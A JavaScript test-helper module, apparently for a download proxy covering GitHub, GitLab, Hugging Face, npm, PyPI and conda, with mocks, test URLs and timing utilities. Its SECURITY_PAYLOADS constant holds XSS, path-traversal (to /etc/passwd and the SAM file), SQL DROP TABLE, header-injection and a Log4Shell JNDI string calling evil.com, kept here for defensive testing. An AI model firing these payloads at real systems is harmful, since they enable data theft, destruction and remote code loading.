/**
 * Test utilities and helper functions
 */

/**
 * Create a mock request with default options
 * @param {string} url - Request URL
 * @param {Object} options - Request options
 * @returns {Request} Mock request object
 */
export function createMockRequest(url, options = {}) {
  const defaultOptions = {
    method: "GET",
    headers: {
      "User-Agent": "Mozilla/5.0 (Test)",
      Accept: "*/*",
    },
  };

  return new Request(url, { ...defaultOptions, ...options });
}

/**
 * Create a mock response with default options
 * @param {string} body - Response body
 * @param {Object} options - Response options
 * @returns {Response} Mock response object
 */
export function createMockResponse(body = "OK", options = {}) {
  const defaultOptions = {
    status: 200,
    statusText: "OK",
    headers: {
      "Content-Type": "text/plain",
    },
  };

  return new Response(body, { ...defaultOptions, ...options });
}

/**
 * Create a Git request for testing
 * @param {string} url - Git repository URL
 * @param {string} service - Git service (upload-pack or receive-pack)
 * @returns {Request} Git request object
 */
export function createGitRequest(url, service = "git-upload-pack") {
  const gitUrl = url.includes("?")
    ? `${url}&service=${service}`
    : `${url}?service=${service}`;

  return new Request(gitUrl, {
    method: service === "git-upload-pack" ? "GET" : "POST",
    headers: {
      "User-Agent": "git/2.34.1",
      "Git-Protocol": "version=2",
      ...(service !== "git-upload-pack" && {
        "Content-Type": `application/x-${service}-request`,
      }),
    },
  });
}

/**
 * Generate test URLs for different platforms
 * @param {string} platform - Platform identifier (gh, gl, hf, etc.)
 * @param {string} path - Resource path
 * @returns {string} Complete test URL
 */
export function generateTestUrl(platform, path) {
  const baseUrl = "https://example.com";
  return `${baseUrl}/${platform}/${path}`;
}

/**
 * Common test URLs for different platforms
 */
export const TEST_URLS = {
  github: {
    file: "https://example.com/gh/microsoft/vscode/blob/main/package.json",
    raw: "https://example.com/gh/microsoft/vscode/raw/main/README.md",
    release:
      "https://example.com/gh/microsoft/vscode/archive/refs/heads/main.zip",
    archive:
      "https://example.com/gh/microsoft/vscode/archive/refs/heads/main.zip",
    git: "https://example.com/gh/microsoft/vscode.git",
  },
  gitlab: {
    file: "https://example.com/gl/gitlab-org/gitlab/-/blob/master/package.json",
    raw: "https://example.com/gl/gitlab-org/gitlab/-/raw/master/README.md",
    archive:
      "https://example.com/gl/gitlab-org/gitlab/-/archive/master/gitlab-master.zip",
    git: "https://example.com/gl/gitlab-org/gitlab.git",
  },
  huggingface: {
    model:
      "https://example.com/hf/microsoft/DialoGPT-medium/resolve/main/config.json",
    dataset: "https://example.com/hf/datasets/squad/resolve/main/train.json",
    file:
      "https://example.com/hf/microsoft/DialoGPT-medium/resolve/main/pytorch_model.bin",
  },
  npm: {
    package: "https://example.com/npm/react",
    tarball: "https://example.com/npm/react/-/react-18.2.0.tgz",
    scoped: "https://example.com/npm/@types/node",
    // Test case for the specific npm package that caused the issue
    npmPackage: "https://example.com/npm/npm",
    npmTarball: "https://example.com/npm/npm/-/npm-11.5.1.tgz",
  },
  pypi: {
    simple: "https://example.com/pypi/simple/requests/",
    package:
      "https://example.com/pypi/packages/source/r/requests/requests-2.31.0.tar.gz",
    wheel:
      "https://example.com/pypi/packages/py3/r/requests/requests-2.31.0-py3-none-any.whl",
  },
  conda: {
    main: "https://example.com/conda/pkgs/main/linux-64/numpy-1.24.3.conda",
    community:
      "https://example.com/conda/community/conda-forge/linux-64/repodata.json",
    repodata: "https://example.com/conda/pkgs/main/linux-64/repodata.json",
  },
};

/**
 * Security test payloads
 */
export const SECURITY_PAYLOADS = {
  xss: [
    "<script>alert(1)</script>",
    "javascript:alert(1)",
    '"><script>alert(1)</script>',
    "';alert(1);//",
  ],
  pathTraversal: [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  ],
  injection: [
    "'; DROP TABLE users; --",
    "${jndi:ldap://evil.com}",
    "{{7*7}}",
    "<%=7*7%>",
  ],
  headerInjection: [
    "value\r\nX-Injected: malicious",
    "value\nX-Injected: malicious",
    "value\r\n\r\n<script>alert(1)</script>",
  ],
};

/**
 * Performance test utilities
 */
export class PerformanceTestHelper {
  constructor() {
    this.measurements = [];
  }

  /**
   * Measure execution time of an async function
   * @param {Function} fn - Async function to measure
   * @param {string} name - Measurement name
   * @returns {Promise<any>} Function result
   */
  async measure(fn, name = "operation") {
    const start = performance.now();
    const result = await fn();
    const end = performance.now();

    this.measurements.push({
      name,
      duration: end - start,
      timestamp: Date.now(),
    });

    return result;
  }

  /**
   * Get all measurements
   * @returns {Array} Array of measurements
   */
  getMeasurements() {
    return [...this.measurements];
  }

  /**
   * Get average duration for a specific measurement name
   * @param {string} name - Measurement name
   * @returns {number} Average duration in milliseconds
   */
  getAverageDuration(name) {
    const filtered = this.measurements.filter((m) => m.name === name);
    if (filtered.length === 0) return 0;

    const total = filtered.reduce((sum, m) => sum + m.duration, 0);
    return total / filtered.length;
  }

  /**
   * Clear all measurements
   */
  clear() {
    this.measurements = [];
  }
}

/**
 * Mock fetch function for testing
 * @param {string} url - Request URL
 * @param {Object} options - Fetch options
 * @returns {Promise<Response>} Mock response
 */
export function mockFetch(url, options = {}) {
  // Simulate network delay
  return new Promise((resolve) => {
    setTimeout(() => {
      if (url.includes("error")) {
        resolve(createMockResponse("Server Error", { status: 500 }));
      } else if (url.includes("notfound")) {
        resolve(createMockResponse("Not Found", { status: 404 }));
      } else {
        resolve(createMockResponse("Mock Response", { status: 200 }));
      }
    }, 10);
  });
}

/**
 * Create a mock npm registry response
 * @param {string} packageName - Package name
 * @param {string} version - Package version
 * @returns {Object} Mock npm registry response
 */
export function createMockNpmRegistryResponse(packageName, version = "1.0.0") {
  return {
    name: packageName,
    versions: {
      [version]: {
        name: packageName,
        version: version,
        dist: {
          tarball:
            `https://registry.npmjs.org/${packageName}/-/${packageName}-${version}.tgz`,
          shasum: "mock-shasum",
          integrity: "mock-integrity",
        },
      },
    },
    "dist-tags": {
      latest: version,
    },
  };
}

/**
 * Validate response headers for security
 * @param {Response} response - Response to validate
 * @returns {Object} Validation results
 */
export function validateSecurityHeaders(response) {
  const requiredHeaders = [
    "Strict-Transport-Security",
    "X-Frame-Options",
    "X-XSS-Protection",
    "Content-Security-Policy",
    "Referrer-Policy",
  ];

  const results = {
    passed: true,
    missing: [],
    present: [],
  };

  requiredHeaders.forEach((header) => {
    if (response.headers.has(header)) {
      results.present.push(header);
    } else {
      results.missing.push(header);
      results.passed = false;
    }
  });

  return results;
}

/**
 * Generate random test data
 */
export const TestDataGenerator = {
  /**
   * Generate random string
   * @param {number} length - String length
   * @returns {string} Random string
   */
  randomString(length = 10) {
    const chars =
      "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  },

  /**
   * Generate random GitHub repository path
   * @returns {string} Repository path
   */
  githubRepo() {
    const users = ["microsoft", "google", "facebook", "apple", "amazon"];
    const repos = ["vscode", "react", "angular", "vue", "node"];
    const user = users[Math.floor(Math.random() * users.length)];
    const repo = repos[Math.floor(Math.random() * repos.length)];
    return `${user}/${repo}`;
  },

  /**
   * Generate random file path
   * @returns {string} File path
   */
  filePath() {
    const dirs = ["src", "lib", "test", "docs", "config"];
    const files = [
      "index.js",
      "main.py",
      "README.md",
      "package.json",
      "config.yml",
    ];
    const dir = dirs[Math.floor(Math.random() * dirs.length)];
    const file = files[Math.floor(Math.random() * files.length)];
    return `${dir}/${file}`;
  },
};

/**
 * Test timeout helper
 * @param {number} ms - Timeout in milliseconds
 * @returns {Promise} Promise that rejects after timeout
 */
export function timeout(ms) {
  return new Promise((_, reject) => {
    setTimeout(() => reject(new Error(`Test timed out after ${ms}ms`)), ms);
  });
}

/**
 * Wait for a specified amount of time
 * @param {number} ms - Time to wait in milliseconds
 * @returns {Promise} Promise that resolves after the specified time
 */
export function wait(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
